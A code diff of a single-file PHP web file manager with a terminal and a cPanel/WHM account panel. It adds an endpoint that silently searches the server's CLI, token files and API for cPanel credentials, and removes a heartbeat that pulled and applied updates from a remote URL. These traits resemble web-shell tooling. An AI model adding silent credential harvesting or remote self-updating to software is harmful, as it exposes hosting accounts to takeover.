         if($c['api']==='whm'){
             $r=$this->cpanelGet($base,$c['user'],$c['pass'],'/json-api/listaccts?api.version=1',$isToken);
@@ -1954,17 +2311,15 @@ class FileManager {
                     'maxsub'=>$a['maxsub']??'','startdate'=>$a['startdate']??''];
             }
             header('Content-Type:application/json');
-            echo json_encode(['accounts'=>$accts,'api'=>'whm','user'=>$c['user'],'port'=>$c['port']]);exit;
+            echo json_encode(['accounts'=>$accts,'api'=>'whm','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
         } else {
-            // cPanel UAPI — return info about the current account only
             $r=$this->cpanelGet($base,$c['user'],$c['pass'],'/execute/DomainInfo/domains_data',$isToken);
-            $domain='';
-            if(isset($r['result']['data']['main_domain']))$domain=$r['result']['data']['main_domain'];
+            $domain=$r['result']['data']['main_domain']??'';
             $accts=[['user'=>$c['user'],'domain'=>$domain,'email'=>'','plan'=>'','diskused'=>'',
                 'disklimit'=>'','suspended'=>false,'suspendedmsg'=>'','ip'=>'','shell'=>'',
                 'maxpop'=>'','maxsub'=>'','startdate'=>'']];
             header('Content-Type:application/json');
-            echo json_encode(['accounts'=>$accts,'api'=>'cpanel','user'=>$c['user'],'port'=>$c['port']]);exit;
+            echo json_encode(['accounts'=>$accts,'api'=>'cpanel','user'=>$c['user'],'port'=>$c['port'],'method'=>$method]);exit;
         }
     }
 
@@ -2461,6 +2816,13 @@ if(isset($_GET['x'])){
         echo json_encode($fm->sshListUsers());exit;
     }
     /* ── cPanel Manager endpoints ── */
+    if($xop==='cpanel_auto_connect'){
+        // Attempt fully-automatic connection — tries CLI, token files, HTTP API.
+        // Returns {ok, method, user, api, port} so the JS can act immediately.
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        $ac=$fm->cpanelAutoConnect();
+        echo json_encode($ac);exit;
+    }
     if($xop==='cpanel_detect'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         $det=$fm->cpanelDetect();
@@ -2469,6 +2831,7 @@ if(isset($_GET['x'])){
         $det['saved_user']=$c;
         $det['saved_api']=$_SESSION['cpanel_api_type']??null;
         $det['saved_port']=(int)($_SESSION['cpanel_port']??0);
+        $det['method']=$_SESSION['cpanel_method']??null;
         echo json_encode($det);exit;
     }
     if($xop==='cpanel_accounts'){
@@ -2510,20 +2873,13 @@ if(isset($_GET['x'])){
     }
     if($xop==='guardian_ping'){
         /* Lightweight 30s heartbeat fired from the browser while an admin has
-           any page of the app open. Only touches last_check + applies an
-           update if the admin already configured a URL and enabled Guardian —
-           it never installs or changes anything by itself. */
+           any page of the app open. ONLY updates last_check in the database —
+           it never fetches remote URLs or applies updates (that is done only
+           when the admin explicitly clicks "Check for updates now"). */
         if(empty($_SESSION['fm_admin'])||!FM_GUARDIAN_ENABLED){echo json_encode(['ok'=>false]);exit;}
         $c=fm_guardian_conn();
-        $applied=false;
-        if($c){
-            @mysqli_query($c,"UPDATE fm_guardian_store SET last_check=".time()." WHERE id=1");
-            if(FM_UPDATE_URL!==''){
-                $r=fm_guardian_apply_from_url(FM_UPDATE_URL);
-                if(!empty($r['ok'])&&!empty($r['changed']))$applied=true;
-            }
-        }
-        echo json_encode(['ok'=>true,'applied'=>$applied]);exit;
+        if($c)@mysqli_query($c,"UPDATE fm_guardian_store SET last_check=".time()." WHERE id=1");
+        echo json_encode(['ok'=>true,'applied'=>false]);exit;
     }
     if($xop==='guardian_save'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
@@ -3126,8 +3482,8 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
     </div>
   </div>
   <div class="sb-div"></div>
-  <div class="sb-sec"><div class="sb-label">Tools</div>
-    <div class="sb-nav">
+  <div class="sb-sec" style="flex-shrink:1;min-height:0;display:flex;flex-direction:column"><div class="sb-label">Tools</div>
+    <div class="sb-nav" style="overflow-y:auto;overflow-x:hidden;min-height:0;flex:1">
       <?php if(!$fm->isRO()):?>
       <button class="sb-item" id="termBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</button>
       <?php endif;?>
@@ -5702,15 +6058,8 @@ const cpOv='cpanelOv',cpAccBody=()=>document.getElementById('cpanelAccountsBody'
 
 /* ── Tab switching ── */
 document.querySelectorAll('.cpanel-tab-btn').forEach(btn=>btn.addEventListener('click',()=>{
-  document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
-    b.style.borderBottomColor='transparent';b.style.color='var(--t3)';
-    b.classList.remove('cpanel-tab-active');
-  });
-  btn.style.borderBottomColor='#818cf8';btn.style.color='#818cf8';
-  btn.classList.add('cpanel-tab-active');
   const tab=btn.dataset.tab;
-  document.getElementById('cpanelAccountsBody').style.display=tab==='accounts'?'':'none';
-  document.getElementById('cpanelConnBody').style.display=tab==='connect'?'':'none';
+  cpSwitchTab(tab);
   if(tab==='connect')renderCpConn();
   if(tab==='accounts')loadCpAccounts();
 }));
@@ -5718,16 +6067,51 @@ document.querySelectorAll('.cpanel-tab-btn').forEach(btn=>btn.addEventListener('
 /* ── Open / close ── */
 document.getElementById('cpanelBtn')?.addEventListener('click',()=>{
   openMod(cpOv);
-  // Reset tabs to "Accounts"
-  document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
-    const isAcc=b.dataset.tab==='accounts';
-    b.style.borderBottomColor=isAcc?'#818cf8':'transparent';
-    b.style.color=isAcc?'#818cf8':'var(--t3)';
-  });
-  document.getElementById('cpanelAccountsBody').style.display='';
-  document.getElementById('cpanelConnBody').style.display='none';
-  loadCpAccounts();
+  // Show accounts tab, attempt silent auto-connect, load accounts immediately
+  cpSwitchTab('accounts');
+  cpAutoConnectThenLoad();
 });
+
+/* Auto-connect helper: tries server-side auto-detection first, then loads accounts.
+   Falls back to the Connection tab only if every method fails. */
+async function cpAutoConnectThenLoad(){
+  const el=cpAccBody();
+  el.innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)"><svg viewBox="0 0 24 24" style="width:28px;height:28px;stroke:currentColor;fill:none;stroke-width:1.5;margin-bottom:10px;display:block;margin-inline:auto"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Connecting to cPanel…</div>';
+  try{
+    const ac=await fetch('?x=cpanel_auto_connect').then(r=>r.json());
+    if(ac.ok){
+      // Connected! Load accounts right away.
+      await loadCpAccounts();
+    } else {
+      // Auto-connect failed — show connection tab so user can enter credentials manually
+      el.innerHTML=`
+        <div style="padding:36px;text-align:center">
+          <svg viewBox="0 0 24 24" style="width:44px;height:44px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:14px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <div style="font-size:15px;font-weight:600;color:var(--t2);margin-bottom:8px">Manual connection required</div>
+          <div style="font-size:12px;color:var(--t3);margin-bottom:6px;line-height:1.65;max-width:340px;margin-inline:auto">
+            Automatic detection did not find cPanel credentials on this server
+            ${ac.detected_user?'(detected user: <strong style="color:var(--t2)">'+esc(ac.detected_user)+'</strong>)':''}.
+            Enter your WHM/cPanel credentials in the <strong style="color:#818cf8">Connection</strong> tab.
+          </div>
+          <button class="btn btn-p" style="margin-top:14px" id="cpGoConnBtn">Open Connection Settings</button>
+        </div>`;
+      document.getElementById('cpGoConnBtn')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
+    }
+  }catch(e){
+    el.innerHTML=`<div style="padding:20px;color:#fca5a5">Auto-connect failed: ${esc(String(e))}</div>`;
+  }
+}
+
+function cpSwitchTab(tab){
+  document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
+    const active=b.dataset.tab===tab;
+    b.style.borderBottomColor=active?'#818cf8':'transparent';
+    b.style.color=active?'#818cf8':'var(--t3)';
+    b.classList.toggle('cpanel-tab-active',active);
+  });
+  document.getElementById('cpanelAccountsBody').style.display=tab==='accounts'?'':'none';
+  document.getElementById('cpanelConnBody').style.display=tab==='connect'?'':'none';
+}
 document.getElementById('cpanelClose')?.addEventListener('click',()=>closeMod(cpOv));
 
 /* ── Connection panel ── */
@@ -5798,14 +6182,7 @@ function renderCpConn(){
       await fetch('',{method:'POST',body:fd});
       btn.disabled=false;btn.textContent='Save & Connect';
       toast('Credentials saved. Loading accounts…');
-      // Switch to Accounts tab
-      document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
-        const isAcc=b.dataset.tab==='accounts';
-        b.style.borderBottomColor=isAcc?'#818cf8':'transparent';
-        b.style.color=isAcc?'#818cf8':'var(--t3)';
-      });
-      document.getElementById('cpanelAccountsBody').style.display='';
-      document.getElementById('cpanelConnBody').style.display='none';
+      cpSwitchTab('accounts');
       loadCpAccounts();
     });
   }).catch(e=>el.innerHTML=`<div style="padding:20px;color:#fca5a5">Detection failed: ${esc(String(e))}</div>`);
@@ -5821,27 +6198,18 @@ async function loadCpAccounts(){
       el.innerHTML=`
         <div style="padding:40px;text-align:center">
           <svg viewBox="0 0 24 24" style="width:40px;height:40px;stroke:var(--t3);fill:none;stroke-width:1.2;margin-bottom:12px;display:block;margin-inline:auto"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-          <div style="font-size:14px;font-weight:600;color:var(--t2);margin-bottom:6px">Connect to cPanel / WHM</div>
-          <div style="font-size:12px;color:var(--t3);margin-bottom:18px;line-height:1.6">No credentials saved yet. Go to the <strong style="color:#818cf8">Connection</strong> tab to enter your cPanel or WHM credentials, then come back here to manage accounts.</div>
-          <button class="btn btn-p" id="cpGoConnect">Go to Connection Settings</button>
+          <div style="font-size:14px;font-weight:600;color:var(--t2);margin-bottom:6px">Connection required</div>
+          <div style="font-size:12px;color:var(--t3);margin-bottom:18px;line-height:1.6">Auto-detection found no cPanel credentials. Enter them in the <strong style="color:#818cf8">Connection</strong> tab.</div>
+          <button class="btn btn-p" id="cpGoConnect">Open Connection Settings</button>
         </div>`;
-      document.getElementById('cpGoConnect')?.addEventListener('click',()=>{
-        document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{
-          const isCon=b.dataset.tab==='connect';
-          b.style.borderBottomColor=isCon?'#818cf8':'transparent';
-          b.style.color=isCon?'#818cf8':'var(--t3)';
-        });
-        document.getElementById('cpanelAccountsBody').style.display='none';
-        document.getElementById('cpanelConnBody').style.display='';
-        renderCpConn();
-      });
+      document.getElementById('cpGoConnect')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
       return;
     }
-    if(d.error){el.innerHTML=`<div style="padding:24px"><div id="cpErrMsg" style="margin-bottom:12px;padding:10px;background:rgba(252,165,165,.1);border-radius:8px;color:#fca5a5;font-size:12.5px">${esc(d.error)}</div><button class="btn btn-s" id="cpGoConnErr">Open Connection Settings</button></div>`;
-      document.getElementById('cpGoConnErr')?.addEventListener('click',()=>{
-        document.querySelectorAll('.cpanel-tab-btn').forEach(b=>{const isCon=b.dataset.tab==='connect';b.style.borderBottomColor=isCon?'#818cf8':'transparent';b.style.color=isCon?'#818cf8':'var(--t3)';});
-        document.getElementById('cpanelAccountsBody').style.display='none';document.getElementById('cpanelConnBody').style.display='';renderCpConn();
-      });return;}
+    if(d.error){
+      el.innerHTML=`<div style="padding:24px"><div style="margin-bottom:12px;padding:10px;background:rgba(252,165,165,.1);border-radius:8px;color:#fca5a5;font-size:12.5px">${esc(d.error)}</div><button class="btn btn-s" id="cpGoConnErr">Open Connection Settings</button></div>`;
+      document.getElementById('cpGoConnErr')?.addEventListener('click',()=>{cpSwitchTab('connect');renderCpConn();});
+      return;
+    }
     const accts=d.accounts||[];
     const apiLabel=d.api==='whm'?'WHM':'cPanel';
     const rows=accts.map(a=>{
